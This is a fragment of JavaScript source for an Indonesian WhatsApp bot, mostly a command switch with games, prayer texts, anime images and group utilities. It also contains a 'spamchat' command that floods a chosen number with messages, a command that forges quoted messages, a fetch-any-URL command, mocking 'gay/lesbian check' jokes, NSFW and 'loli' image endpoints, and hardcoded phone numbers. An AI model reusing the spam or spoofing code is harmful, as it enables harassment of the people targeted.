					const can =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const tik = can[Math.floor(Math.random() * can.length)]
					xdev.sendMessage(from, 'Pertanyaan : *'+cantik+'*\n\nJawaban : '+ tik+'%', text, { quoted: dev })
					break
	case 'gantengcek':
					ganteng = body.slice(1)
					const gan =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const teng = gan[Math.floor(Math.random() * gan.length)]
					xdev.sendMessage(from, 'Pertanyaan : *'+ganteng+'*\n\nJawaban : '+ teng+'%', text, { quoted: dev })
					break
	case 'lesbicek':
					lesbii = body.slice(1)
					const lesbi =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const bi = lesbi[Math.floor(Math.random() * lesbi.length)]
					xdev.sendMessage(from, 'Pertanyaan : *'+lesbii+'*\n\nJawaban : '+ bi+'%', text, { quoted: dev })
					break
	case 'gaycek':
					gayy = body.slice(1)
					const gay =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const yag = gay[Math.floor(Math.random() * gay.length)]
					xdev.sendMessage(from, 'Pertanyaan : *'+gayy+'*\n\nJawaban : '+ yag+'%', text, { quoted: dev })
					break
	case 'sangecek':
					sange = body.slice(1)
					const sang =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const nge = sang[Math.floor(Math.random() * sang.length)]
					xdev.sendMessage(from, 'Pertanyaan : *'+sange+'*\n\nJawaban : '+ nge+'%', text, { quoted: dev })
					break
	case 'bagaimanakah':
					bagaimanakah = body.slice(1)
					const bagai =['Kita Kenal?','Nanya Terus deh','Tidak Tahu','Coba Ulangi','Cari Aja Sendiri','Kurang Tahu','Mana Saya Tahu, Saya kan ikan']
					const mana = bagai[Math.floor(Math.random() * bagai.length)]
					xdev.sendMessage(from, 'Pertanyaan : *'+bagaimanakah+'*\n\nJawaban : '+ mana, text, { quoted: dev })
					break
	case 'kapankah':
					kapankah = body.slice(1)
					const kapan =['Besok','Lusa','1 Hari Lagi','2 Hari Lagi','3 Hari Lagi','4 Hari Lagi','5 Hari Lagi','6 Hari Lagi','1 Bulan Lagi','2 Bulan Lagi','3 Bulan Lagi','4 Bulan Lagi','5 Bulan Lagi','6 Bulan Lagi','7 Bulan Lagi','8 Bulan Lagi','9 Bulan Lagi','10 Bulan Lagi','11 Bulan Lagi','1 Tahun lagi','2 Tahun lagi','3 Tahun lag0i','4 Tahun lagi','5 Tahun lagi','6 Tahun lagi','7 Tahun lagi','8 Tahun lagi','9 Tahun lagi','10 Tahun lagi']
					const koh = kapan[Math.floor(Math.random() * kapan.length)]
					xdev.sendMessage(from, 'Pertanyaan : *'+kapankah+'*\n\nJawaban : '+ koh, text, { quoted: dev })
					break
//-----------------< CASE GTTS >------------------------
	case 'gtts':
	case 'tts':
					if (args.length < 1) return xdev.sendMessage(from, 'Kode bahasanya mana om?', text, {quoted: dev})
					if (args.length < 1) return xdev.sendMessage(from, 'Bahasa not supported', text, {quoted: dev})
					const gtts = require('./lib/gtts')(args[0])
					if (args.length < 2) return xdev.sendMessage(from, 'Textnya mana om', text, {quoted: dev})
					dtt = body.slice(7)
					ranm = getRandom('.mp3')
					dtt.length > 600
					? reply('Textnya kebanyakan om')
					: gtts.save(ranm, dtt, function() {
						xdev.sendMessage(from, fs.readFileSync(ranm), audio, {quoted: dev, mimetype: 'audio/mp4', ptt:true})
						fs.unlinkSync(ranm)
					})
					break
//--------------<CASE BHS>------------------
	/*case 'bahasa':
	case 'bhs':
		return reply('af: Afrikaans\nsq: Albanian\nar: Arabic\nhy: Armenian\nca: Catalan\nzh: Chinese\nzh-cn: Chinese (Mandarin/China)
  'zh-tw': 'Chinese (Mandarin/Taiwan)',
  'zh-yue': 'Chinese (Cantonese)',
  'hr': 'Croatian',
  'cs': 'Czech',
  'da': 'Danish',
  'nl': 'Dutch',
  'en': 'English',
  'en-au': 'English (Australia)',
  'en-uk': 'English (United Kingdom)',
  'en-us': 'English (United States)',
  'eo': 'Esperanto',
  'fi': 'Finnish',
  'fr': 'French',
  'de': 'German',
  'el': 'Greek',
  'ht': 'Haitian Creole',
  'hi': 'Hindi',
  'hu': 'Hungarian',
  'is': 'Icelandic',
  'id': 'Indonesian',
  'it': 'Italian',
  'ja': 'Japanese',
  'ko': 'Korean',
  'la': 'Latin',
  'lv': 'Latvian',
  'mk': 'Macedonian',
  'no': 'Norwegian',
  'pl': 'Polish',
  'pt': 'Portuguese',
  'pt-br': 'Portuguese (Brazil)',
  'ro': 'Romanian',
  'ru': 'Russian',
  'sr': 'Serbian',
  'sk': 'Slovak',
  'es': 'Spanish',
  'es-es': 'Spanish (Spain)',
  'es-us': 'Spanish (United States)',
  'sw': 'Swahili',
  'sv': 'Swedish',
  'ta': 'Tamil',
  'th': 'Thai',
  'tr': 'Turkish',
  'vi': 'Vietnamese',
  'cy': 'Welsh'
) */

//------------------< CASE SIMI >--------------------
	case 'simi':
					if (args.length < 1) return reply('Textnya mana um?')
					teks = body.slice(5)
					anu = await simih(teks) //await fetchJson(`https://hardianto-chan.herokuapp.com/api/fun/simi?text=${teks}`, {method: get})
					//if (anu.error) return reply('Simi ga tau kak')
					reply(anu)
					break
// --------------------< CASE TTP ATTP >-----------------
	case 'ttp':
	case 'ttp2':
	case 'ttp3':
	case 'ttp4':
	case 'attp':
                    if (args.length == 0) return reply(`Example: ${prefix + command} HamBotz`)
                    ini_mn1k = args.join(" ")
                    ini_buffer = await getBuffer(`http://api.lolhuman.xyz/api/${command}?apikey=${TT}&text=${encodeURI(ini_mn1k)}`)
                    xdev.sendMessage(from, ini_buffer, sticker, { quoted: dev})
                    break
	case 'listadmin':
					if (!isGroup) return reply(mess.only.group)
					teks = `List admin of group *${groupMetadata.subject}*\nTotal : ${groupAdmins.length}\n\n`
					no = 0
					for (let admon of groupAdmins) {
						no += 1
						teks += `[${no.toString()}] @${admon.split('@')[0]}\n`
					}
					mentions(teks, groupAdmins, true)
					break
	case 'block':
				 xdev.updatePresence(from, Presence.composing) 
				 xdev.chatRead (from)
					if (!isGroup) return reply(mess.only.group)
					if (!isOwner) return reply(mess.owner)
					xdev.blockUser (`${body.slice(7)}@c.us`, "add")
					xdev.sendMessage(from, `*Perintah Diterima, Memblokir* ${body.slice(7)}@c.us`, text)
					break
	case 'unblock':
					if (!isGroup) return reply(mess.only.group)
					if (!isOwner) return reply(mess.owner)
				    xdev.blockUser (`${body.slice(9)}@c.us`, "remove")
					xdev.sendMessage(from, `*Perintah Diterima, Membuka Blockir* ${body.slice(9)}@c.us`, text)
					break
	case 'infogrup':
	case 'infogrouup':
	case 'grupinfo':
	case 'groupinfo':
                if (!isGroup) return reply(mess.only.group)
                try {
                    var pic = await xdev.getProfilePicture(from)
                } catch {
                    var pic = 'https://i.ibb.co/Tq7d7TZ/age-hananta-495-photo.png'
                }
                let ingfo = `*G R O U P I N F O*\n\n*Name :* ${groupName}\n*ID Grup :* ${from}\n*Dibuat :* ${moment(`${groupMetadata.creation}` * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n*Owner Grup :* @${groupMetadata.owner.split('@')[0]}\n*Jumlah Admin :* ${groupAdmins.length}\n*Jumlah Peserta :* ${groupMembers.length}\n*Desc :* \n${groupMetadata.desc}`
                xdev.sendMessage(from, await getBuffer(pic), image, {quoted: dev, caption: ingfo, contextInfo: {"mentionedJid": [groupMetadata.owner.replace('@c.us', '@s.whatsapp.net')]}})
                break
	case 'tagme':
                mentions(`@${sender.split("@")[0]}`, [sender], true)
                break
	case 'wame':
             xdev.updatePresence(from, Presence.composing)
             options = {
             text: `Link WhatsApp-Mu : *wa.me/${sender.split("@s.whatsapp.net")[0]}*\n*Or ( / )*\n*api.whatsapp.com/send?phone=${sender.split("@")[0]}*`,
              contextInfo: {
              mentionedJid: [sender]
              }
              }
              xdev.sendMessage(from, options, text, {quoted: dev})
              break
//-----------------< CASE RANDOM TEXT>---------------------
	
//------------------------

	case 'grouplist':
					xdev.updatePresence(from, Presence.composing) 
					teks = `\`\`\`Ini adalah list group 𝐻𝑎𝑚𝐵𝑜𝑡𝑧 :\n\n\`\`\``
					no = 0
					for (let hehehe of groupId) {
						no += 1
						teks += `\`\`\`[${no.toString()}]\`\`\` @${hehehe.split('@')[0]}\n`
					}
					teks += `\n\`\`\`Total grup : ${groupId.length}\`\`\``
					xdev.sendMessage(from, teks.trim(), extendedText, {quoted: dev})
					break
	case 'shutdown':
                    if (!dev.key.fromMe && !isOwner) return reply(mess.owner)
			        reply(`GOOD BYE OWNER, I LOVE YOU`) 
					await sleep (3000) 
					//xdev.process.exit()
					return xdev.sendMessage(from, JSON.stringify(eval(process.exit())), text, { quoted: dev}) 
                    break
	case 'restart':
if (!isOwner) return reply(mess.owner)
reply(`_Restarting HamBotz_`)
exec(`node run`)
setTimeout( () => {
					xdev.sendMessage(from, '_1_', text) // ur cods
					}, 3000) // 1000 = 1s,
					setTimeout( () => {
					xdev.sendMessage(from, '_2_', text) // ur cods
					}, 2000) // 1000 = 1s,
					setTimeout( () => {
					xdev.sendMessage(from, '_3_', text) // ur cods
					}, 1000) // 1000 = 1s,
					setTimeout( () => {
					reply(`_Succses Restart HamBotz_`) // ur cods
					},4000) // 1000 = 1s,
break
//-----------< ANTI DELETE >----------------
	
case 'antidelete':
if (!isOwner && !itsMe) return
if (args.length < 1) return reply('Pilih on atau off')
if (args[0] === "on") {
if(antidel)return reply('Sudah diaktifkan sebelumnya!')
antidel = true
reply(`Succes mengaktifkan antidelete`)
} else if (args[0] === "off") {
if(!antidel)return reply('Sudah di NonAktifkan sebelumnya!')
antidel = false
reply(`Succes mematikan antidelete`)
} else {
reply(`Pilih on atau off`)
}
break

// REQUEST/BUGREPORT BY hambotz
	case 'request':
					if (args.length < 1) return reply(`Mau request apa? Contoh: ${prefix}request fitur anime`)         				
					const cfrr = body.slice(8)
					if (cfrr.length > 300) return xdev.sendMessage(from, 'Maaf Teks Terlalu Panjang, Maksimal 300 Teks', text, {quoted: dev})
					var tonor = dev.participant
					const ress = `*[REQUEST]*\nNomor : @${tonor.split("@s.whatsapp.net")[0]}\nPesan : ${cfrr}`
					var options = {
					text: ress,
					contextInfo: {mentionedJid: [tonor]},
					}
                    xdev.sendMessage('6287729860010@s.whatsapp.net', options, text, {quoted: dev})
                    reply('REQUEST ANDA TELAH SAMPAI ke owner BOT, Requests palsu/main2 tidak akan ditanggapi.')
                    break

	case 'bugreport':
	case 'lapor':
					if (args.length < 1) return reply(`Mau lapor apa? Contoh: ${prefix}lapor fitur anime error`)          			
					const kontil = body.slice(11)
					if (kontil.length > 300) return xdev.sendMessage(from, 'Maaf Teks Terlalu Panjang, Maksimal 300 Teks', text, {quoted: dev})
					var tonmor = dev.participant
					const buseh = `*[BUG REPORT]*\nNomor : @${tonmor.split("@s.whatsapp.net")[0]}\nPesan : ${kontil}`
					var options = {
					text: buseh,
					contextInfo: {mentionedJid: [tonmor]},
					}
                    xdev.sendMessage('6287729860010@s.whatsapp.net', options, text, {quoted: dev})
                    reply('LAPORAN ANDA TELAH SAMPAI ke owner BOT, Laporan palsu/main2 tidak akan ditanggapi.')
                    break

	case 'getpic':
					if (!isGroup) return reply(mess.only.group) 
					if (args.length < 1) return reply(`Cara menggunakan ${prefix}getpic @tag`) 
					if (dev.message.extendedTextMessage === undefined || dev.message.extendedTextMessage === null) return reply('Siap Boss')
					mentioned = dev.message.extendedTextMessage.contextInfo.mentionedJid[0]
						try {
						pp = await xdev.getProfilePicture(mentioned)
						buffer = await getBuffer(pp)
						xdev.sendMessage(from, buffer, image, {quoted: ftoko, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
					} catch (e) {
						xdev.sendMessage(from, buffer, image, {quoted: ftoko, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
					}
				break
	
case 'spamchat': //CASE BY xdev
if (args < 2) return reply(`masukan parameter yang benar\nexampel : ${prefix}spamchat nomer tujuan jumlah pesan\ncontoh ${prefix}spamchat 082334297175 10 woi asu`)
nomer = args[0]
totall = args[1]
p = args[1]
for ( let i = 0 ; i < totall; i++) {
xdev.sendMessage( nomer + '@s.whatsapp.net' , p , text)
}  
break
case 'suratto': // Case By M4N1K
				if (args.length < 1) return reply(`Ketik ${prefix}suratto No tujuan|Isi surat\nMax 5 Kata`)
				const textp = body.slice(9)
				const noorg2 = textp.split("|")[0]
				const katakita2 = textp.split("|")[1]
				const kataorg2 = `Surat Dari ${sender}`
				try {
				pping = await xdev.getProfilePicture(`${sender.split('@')[0]}@c.us`)
				} catch {
				pping = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
				}
				const mnik = `
╔════ ◤ *SURAT FITUR* ◢
║╔▸
║╠ *From* : ${pushname}
║╠ *Number* : @${sender.split("@")[0]}
║╠ *For* : You
║╚▸
║╔▸   ﹝ *ISI SURAT* ﹞  
║╠ ${katakita2}
║╚▸
║╔▸   ﹝ *BALAS SURAT* ﹞  
║╠ Untuk Membalas Ketik:
║╠ #suratto (No tujuan|Isi Surat)
║╠ Contoh: 
║╠ #suratto 6285737134572|Hai Juga
║╚▸
╚═══ ◤ *_HamBotz_* ◢ `
				xdev.sendMessage(`${noorg2}@s.whatsapp.net`,pping, image , {caption: mnik, quoted: { key: {fromMe:false, participant:`${noorg2}@s.whatsapp.net`},message: { conversation: `${kataorg2}`, contextInfo: {"mentionedJid": [sender]}}}});	
				reply('Surat Sukses Dikirim')
				break

case 'memeindo':
xdev.updatePresence(from, Presence.composing) 
				    data = await fetchJson(`https://fdciabdul.tech/api/pinterest?keyword=memeindo`, {method: 'get'})
				    reply(mess.wait)
				    n = JSON.parse(JSON.stringify(data));
				    nimek =  n[Math.floor(Math.random() * n.length)];
				    pok = await getBuffer(nimek)
				    xdev.sendMessage(from, pok, image, { quoted: ftroli})
break 

case 'stats':
				var groups = xdev.chats.array.filter(v => v.jid.endsWith('g.us'))
				var privat = xdev.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
				var ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
					uptime = process.uptime();
					const Timestamp = speed();
					const totalChat = await xdev.chats.all()
					var charge = charging ? 'true' : 'false'
					var listrik = charging ? 'Charger' : 'Not Charger'
					const Latensi = speed() - Timestamp
					var total = math(`${groups.length} ${privat.length}`)
					const { wa_version, mcc, mnc, os_version, device_manufacturer, device_model } = xdev.user.phone
					stamtus = `Private Chat : ${privat.length}
Group Chat : ${groups.length}
Total Chat : ${totalChat.length}
Hit Today : ${hit_today.length}
Speed : ${Latensi.toFixed(4)} Second
Runtime : ${kyun(uptime)}
Baterai : ${batterylevel}% ${listrik}
Status : ${banChats ? 'SELF-MODE' : 'PUBLIC-MODE'}
Penggunaan Ram : ${ram2}
Hostname : ${os.hostname()}
Platform : ${os.platform()}
Uptime : ${kyun(os.uptime())}
MNC : ${mnc}
MCC : ${mcc}
Device Model: ${xdev.user.phone.device_model}
Device Manufactur : ${device_manufacturer}
Wa Version: ${xdev.user.phone.wa_version}
Os Version: ${xdev.user.phone.os_version}`
xdev.sendMessage(from, stamtus, text, {quoted: dev}) 
break

case 'mutual':
                if (isGroup) return reply( 'Command ini tidak bisa digunakan di dalam grup!')
				if (!isRegistered)  return reply(mess.noregis) 
                anug = getRegisteredRandomId(_registered).replace('@s.whatsapp.net','')
                await reply('Looking for a partner...')
                await reply(`wa.me/${anug}`)
                await reply( `Partner found: 🙉\n${prefix}next — find a new partner`)
           	break
		case 'next':
                if (!isRegistered) return reply(aml.noregis)
                if (isGroup) return reply( 'Command ini tidak bisa digunakan di dalam grup!')
                anug = getRegisteredRandomId(_registered).replace('@s.whatsapp.net','')
                await reply('Looking for a partner...')
                await reply(`wa.me/${anug}`)
                await reply( `Partner found: 🙉\n${prefix}next — find a new partner`)
        	break

    case 'delvote':
            if(!dev.key.remoteJid) return
            if(isVote) return reply('Tidak ada sesi Voting')
            delVote(from)
            reply('Sukses Menghapus sesi Voting Di Grup Ini')
            break
    case 'voting':
            if(!isGroupAdmins && !dev.key.fromMe) return 
            if(!isGroup) return reply(mess.only.group)
            if (isVote) return reply('Sesi Voting Sedang Berlangsung Di Grup Ini')
            if(!q) return reply('*Voting*\n\n'+ prefix+ 'voting @tag target | reason  | 1 (1 = 1 Menit)')
            if (dev.message.extendedTextMessage.contextInfo.mentionedJid.length > 0 || dev.message.extendedTextMessage.contextInfo == null) {
            let id = dev.message.extendedTextMessage.contextInfo.mentionedJid[0]
            split = args.join(' ').replace('@', '').split('|')
            if(!Number(split[2])) return reply('masukan angka di baris ke 3\nContoh: 1-9999\n1 = 1 Menit')
            await mentions('Vote ' +'@'+ id.split('@')[0]+' Di Mulai' +'\n\n' + `vote = ✅\ndevote = ❌\n\nAlasan: ${split[1]}`,[id],true)
            addVote(from,split[1],split[0],split[2],reply)
            }
            break
    case 'linkwa':
            if(!q) return reply('cari group apa?')
            hx.linkwa(q)
            .then(result => {
            let res = '*「 _LINK WA_ 」*\n\n'
            for (let i of result) {
            res += `*Nama*: *${i.nama}\n*Link*: ${i.link}\n\n`
            }
            reply(res)
            });
            break
    case 'igstory': 
            if(!q) return reply('Usernamenya?')
            hx.igstory(q)
            .then(async result => {
            for(let i of result.medias){
                if(i.url.includes('mp4')){
                    let link = await getBuffer(i.url)
                    xdev.sendMessage(from,link,video,{quoted: dev,caption: `Type : ${i.type}`})
                } else {
                    let link = await getBuffer(i.url)
                    xdev.sendMessage(from,link,image,{quoted: dev,caption: `Type : ${i.type}`})                  
                }
            }
            });
            break
    case 'caripesan':
            if(!q)return reply('pesannya apa bang?')
            let v = await xdev.searchMessages(q,from,10,1)
            let s = v.messages
            let el = s.filter(v => v.message)
            el.shift()
            try {
            if(el[0].message.conversation == undefined) return
            reply(`Ditemukan ${el.length} pesan`)
            await sleep(3000)
            for(let i = 0; i < el.length; i++) {
            await xdev.sendMessage(from,'Nih pesannya',text,{quoted:el[i]})
            }
            } catch(e){
            reply('Pesan tidak ditemukan!')
            }           
            break
    case 'lirik':
            if(!q) return reply('lagu apa?')
            let song = await hx.lirik(q)
            sendMediaURL(from,song.thumb,song.lirik)
            break
    case 'otaku':
            if(!q) return reply('judul animenya?')
            let anime = await hx.otakudesu(q)
            rem = `*Judul* : ${anime.judul}
*Jepang* : ${anime.jepang}
*Rating* : ${anime.rate}
*Produser* : ${anime.produser}
*Status* : ${anime.status}
*Episode* : ${anime.episode}
*Durasi* : ${anime.durasi}
*Rilis* : ${anime.rilis}
*Studio* : ${anime.studio}
*Genre* : ${anime.genre}\n
*Sinopsis* :
${anime.desc}\n\n*Link Batch* : ${anime.batch}\n*Link Download SD* : ${anime.batchSD}\n*Link Download HD* : ${anime.batchHD}`
            ram = await getBuffer(anime.img)
            xdev.sendMessage(from,ram,image,{quoted:dev,caption:rem})
            break
    case 'komiku':
            if(!q) return reply(`judulnya?\n${prefix}komiku mao gakuin`)
            let komik = await hx.komiku(q)
            result = `*Title* : ${komik.title}\n
*Title Indo* : ${komik.indo}\n
*Update* : ${komik.update}\n
*Desc* : ${komik.desc}\n
*Chapter Awal* : ${komik.chapter_awal}
*Chapter Akhir* : ${komik.chapter_akhir}`
            sendMediaURL(from, komik.image,result)
            break
            case 'asmaulhusna':
anu = await fetchJson(`https://hardianto-chan.herokuapp.com/muslim/asmaulhusna`)
				   for (let o of anu.result.data) {
					  teks += `*${o.latin}*\n*Arab:* ${o.arabic}\n*Latin:* ${o.translation_id}\n=============================\n`
				   }
				   reply(teks)
            break

case 'kisahnabi':
if (!q) return reply(`Example: ${prefix + command} kisahnabi muhammad`)
get_result = await fetchJson(`https://hardianto-chan.herokuapp.com/kisahnabi?nabi=${q}`)
                    get_result = get_result.result.nabi
                    ini_txt = `Nabi : ${get_result.nabi}\n`
                    ini_txt += `Lahir : ${get_result.lahir}\n`
                    ini_txt += `Umur : ${get_result.umur}\n`
                    ini_txt += `Tempat : ${get_result.tempat}`
ini_txt += `Kisah : ${get_result.kisah}`
                    reply(ini_txt)
                     break

case 'doaharian':
anu = await fetchJson(`https://hardianto-chan.herokuapp.com/muslim/doaharian`)
				   teks = `*◪* *DOA HARIAN*\n\n`
				   for (let ei of anu.result.data) {
					  teks += `*${ei.title}*\n*Arab:* ${ei.arabic}\n*Latin:* ${ei.latin}\n*Terjemah:* ${ei.translation}\n=============================\n`
				   }
				   reply(teks)
            break

case 'ayatkursi':
anu = await fetchJson(`https://hardianto-chan.herokuapp.com/muslim/ayatkursi`)
				    oi = anu.result.data
					teks = `*◪* *AYAT KURSI*\n\n*Arab:* ${oi.arabic}\n*Latin:* ${oi.latin}\n*Terjemah:* ${oi.translation}`
				   reply(teks)
             break

case 'bacaanshalat':
anu = await fetchJson(`https://hardianto-chan.herokuapp.com/muslim/bacaanshalat`)
				   teks = `*╔❏* *BACAAN SHALAT*\n\n`
				   for (let ui of anu.result) {
					  teks += `*${ui.name}*\n*Arab:* ${ui.arabic}\n*Latin:* ${ui.latin}\n*Terjemah:* ${ui.terjemahan}\n=============================\n`
				   }
				   reply(teks)
             break
             case 'hadist':
             if (!q) return reply(`contoh ${prefix}hadist bukhari|52`)
var teks = body.slice(8)
                       t1 = teks.split('|')[0]
                       t2 = teks.split('|')[1]
get_result = await fetchJson(`https://hardianto-chan.herokuapp.com/hadits?kitab=${t1}&nomor=${t2}`)
                    get_result = get_result.result
                    ini_txt = `Judul : ${get_result.message}\n`
                    ini_txt += `Nama : ${get_result.data.name}\n`
                    ini_txt += `id : ${get_result.data.id}\n`
                    ini_txt += `Available : ${get_result.data.available}`
ini_txt += `Nomor : ${get_result.data.contents.number}\n`
ini_txt += `Arab : ${get_result.data.contents.arab}\n`
ini_txt += `Latin : ${get_result.data.contents.id}`
                    reply(ini_txt)
break
case 'tahlil':
anu = await fetchJson(`https://hardianto-chan.herokuapp.com/muslim/tahlil`)
				   for (let io of anu.result.data) {
					  teks += `*${io.latin}*\n*title:* ${io.title}\n*arabic:* ${io.arabic}\n=============================\n`
				   }
				   reply(teks)
				break
				case 'doawirid':
anu = await fetchJson(`https://hardianto-chan.herokuapp.com/muslim/wirid`)
				   for (let op of anu.result.data) {
					  teks += `*${op.id}*\n*Arab:* ${op.times}\n*Latin:* ${op.arabic}\n=============================\n`
				   }
				   reply(teks)
				break
				case 'jadwalsholat':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Yogyakarta`)
                    daerah = args.join(" ")
                    get_result = await fetchJson(`https://hardianto-chan.herokuapp.com/jsholat?daerah=${daerah}`)
                    get_result = get_result.jadwal
                    ini_txt = `Wilayah : ${daerah}\n`
                    ini_txt += `Sahur : ${get_result.Fajr}\n`
                    ini_txt += `Imsak : ${get_result.Imsak}\n`
                    ini_txt += `Subuh : ${get_result.Fajr}\n`
                    ini_txt += `Terbit : ${get_result.Sunrise}\n`
                    ini_txt += `Dzuhur : ${get_result.Dhuhr}\n`
                    ini_txt += `Ashar : ${get_result.Asr}\n`
                    ini_txt += `Maghrib : ${get_result.Maghrib}\n`
                    ini_txt += `Isya : ${get_result.Isha}`
                    reply(ini_txt)
                    break
                    case 'niatsholat':
anu = await fetchJson(`https://hardianto-chan.herokuapp.com/muslim/niatshalat`)
				   for (let oa of anu.result) {
					  teks += `*${oa.id}*\n*nama:* ${oa.name}\n*arabic:* ${oa.arabic}\n*latin:* ${oa.latin}\n=============================\n`
				   }
				   reply(teks)
				break
    case 'chara':
            if(!q) return reply(`gambar apa?\n${prefix}chara nino`)
            let im = await hx.chara(q)
            let acak = im[Math.floor(Math.random() * im.length)]
            let li = await getBuffer(acak)
            await xdev.sendMessage(from,li,image,{quoted: dev})
            break
     case 'waifu':
     reply(mess.wait)
waifu = await getBuffer(`https://hardianto-chan.herokuapp.com/waifu`)
xdev.sendMessage(from, waifu, image, {quoted: ftroli})
break
case 'loli':
reply(mess.wait)
loli = await getBuffer(`https://hardianto-chan.herokuapp.com/loli`)
xdev.sendMessage(from, loli, image, {quoted: ftroli})
break
case 'sagiri':
reply(mess.wait)
loli = await getBuffer(`https://hardianto-chan.herokuapp.com/sagiri`)
xdev.sendMessage(from, loli, image, {quoted: ftroli})
break
case 'neko':
reply(mess.wait)
loli = await getBuffer(`https://hardianto-chan.herokuapp.com/neko`)
xdev.sendMessage(from, loli, image, {quoted: ftroli})
break
case 'megumin':
reply(mess.wait)
loli = await getBuffer(`https://hardianto-chan.herokuapp.com/megumin`)
xdev.sendMessage(from, loli, image, {quoted: ftroli})
break
case 'nsfwneko':
reply(mess.wait)
loli = await getBuffer(`https://hardianto-chan.herokuapp.com/nsfw/neko`)
xdev.sendMessage(from, loli, image, {quoted: ftroli})
break
case 'nsfwwaifu':
reply(mess.wait)
loli = await getBuffer(`https://hardianto-chan.herokuapp.com/nsfw/waifu`)
xdev.sendMessage(from, loli, image, {quoted: ftroli})
break
case 'wallpaperanime':
reply(mess.wait)
loli = await getBuffer(`https://hardianto-chan.herokuapp.com/wpnime`)
xdev.sendMessage(from, loli, image, {quoted: ftroli})
break

case 'husbu':
reply(mess.wait)
tod = await fetchJson(`https://hardianto-chan.herokuapp.com/husbu`)
tid = await getBuffer(tod.url)
xdev.sendMessage(from, tid, image, {quoted: ftroli})
break
/*case 'quotes':
reply(mess.wait)
tod = await fetchJson(`https://hardianto-chan.herokuapp.com/randomquote`)
reply(tod.quote.quotes)
break*/
case 'faktaunik':
reply(mess.wait)
tod = await fetchJson(`https://hardianto-chan.herokuapp.com/fakta`)
reply(tod.result)
break
case 'quotesbucin':
reply(mess.wait)
bucin = await fetchJson(`https://hardianto-chan.herokuapp.com/katabucin`)
reply(bucin.result)
break
case 'quotesmuslim':
reply(mess.wait)
tod = await fetchJson(`https://hardianto-chan.herokuapp.com/randomquote/muslim`)
reply(tod.result.text_id)
break
case 'quoteskanye':
reply(mess.wait)
tod = await fetchJson(`https://hardianto-chan.herokuapp.com/quotes/kanye`)
reply(tod.result.text_id)
break

case 'wallpaper':
reply(mess.wait)
tod = await fetchJson(`https://hardianto-chan.herokuapp.com/random/wallpaper`)
xdev.sendMessage(from, await getBuffer(tod.result.url), image, {quoted: ftroli})
break
case 'darkjokes':
reply(mess.wait)
					data = fs.readFileSync('./lib/darkjokes.js');
					jsonData = JSON.parse(data);
					randIndex = Math.floor(Math.random() * jsonData.length);
					randKey = jsonData[randIndex];
					hasil = await getBuffer(randKey.result)
					xdev.sendMessage(from, hasil, image, {quoted: ftroli, caption: '*GELAP BOS :V*'})
				break
    case 'pinterest':
        
            if(!q) return reply('gambar apa?')
            reply(mess.wait)
            let pin = await hx.pinterest(q)
            let ac = pin[Math.floor(Math.random() * pin.length)]
            let di = await getBuffer(ac)
            await xdev.sendMessage(from,di,image,{quoted: dev})
            break
    case 'playstore':
            if(!q) return reply('lu nyari apa?')
            let play = await hx.playstore(q)
            let store = '❉─────────────────────❉\n'
            for (let i of play){
            store += `\n*「 _PLAY STORE_ 」*\n
- *Nama* : ${i.name}
- *Link* : ${i.link}\n
- *Dev* : ${i.developer}
- *Link Dev* : ${i.link_dev}\n❉─────────────────────❉`
            }
            reply(store)
            break
    case 'on':
            if (!dev.key.fromMe && !isOwner) return 
            offline = false
            fakestatus(' ```ANDA TELAH ONLINE``` ')
            break       
    case 'status':
            fakestatus(`*STATUS*\n${offline ? '> OFFLINE' : '> ONLINE'}\n${banChats ? '> SELF-MODE' : '> PUBLIC-MODE'}`)
            break
    case 'off':
            if (!dev.key.fromMe && !isOwner) return 
            offline = true
            waktu = Date.now()
            anuu = q ? q : '-'
            alasan = anuu
            fakestatus(' ```ANDA TELAH OFFLINE``` ')
            break   
    case 'get':
            if(!q) return reply('linknya?')
            fetch(`${args[0]}`).then(res => res.text())  
            .then(bu =>{
            fakestatus(bu)
            })   
            break
     case 'ttstalk':
     if (!q) return reply('masukan username tiktoknya kak!')
tod = await fetchJson(`https://hardianto-chan.herokuapp.com/tiktod/stalk/?username=${q}`)
tid = tod.result.user
ted = tod.result.stats
